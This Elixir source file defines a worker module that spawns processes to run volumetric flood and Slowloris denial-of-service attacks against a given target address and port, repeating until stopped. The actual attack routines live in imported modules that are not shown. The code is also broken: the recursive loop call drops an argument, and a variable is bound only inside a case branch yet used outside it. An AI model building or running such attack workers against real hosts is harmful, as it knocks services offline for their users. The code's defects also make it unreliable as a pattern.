defmodule AttackWorker do
  require Logger
  import SlowLoris
  import Volumetric

  # Worker module for attacks.

  # Spawns the worker process and links it to the calling process
  def start_link(attack_type, target_address, target_port, transmission_interval) do
    case attack_type do
      "volumetric" ->
        socket = :none
      "slowloris" ->
        socket = SlowLoris.start_connection(target_address, target_port)
    end
    spawn_link(fn -> loop(attack_type, target_address, target_port, transmission_interval, socket) end)
  end


  # Loops indefinitely and performs requests until a stop message is received
  defp loop(attack_type, target_address, target_port, transmission_interval, socket) do
    case attack_type do
      "volumetric" ->
        # Replace with actual volumetric attack
        do_volumetric(target_address, target_port)
        Process.sleep(:rand.uniform(5) * 1000)

      "slowloris" ->
        # Replace with actual slowloris attack
        do_slowloris(socket)
        Process.sleep(:rand.uniform(5) * 1000)

      end

      receive do
        {:stop_attack} ->
          :ok

      after
        10 ->
          loop(attack_type, target_address, target_port, transmission_interval)

      end
  end

  # Placeholder functions, either implement functionality in them or replace them

  defp do_volumetric(_target_address, _target_port) do
    if :rand.uniform(5) == 5 do
      Process.exit(self(), "Random termination")
    end
    Volumetric.send_request(_target_address, _target_port)
    Logger.info("#{inspect(self())} - Volumetric request complete")
  end

  defp do_slowloris(socket) do
    SlowLoris.send_header(socket)
    Logger.info("#{inspect(self())} - Slowloris request complete")
  end

  def stop(pid) do
    send(pid, {:stop_attack})
  end
end
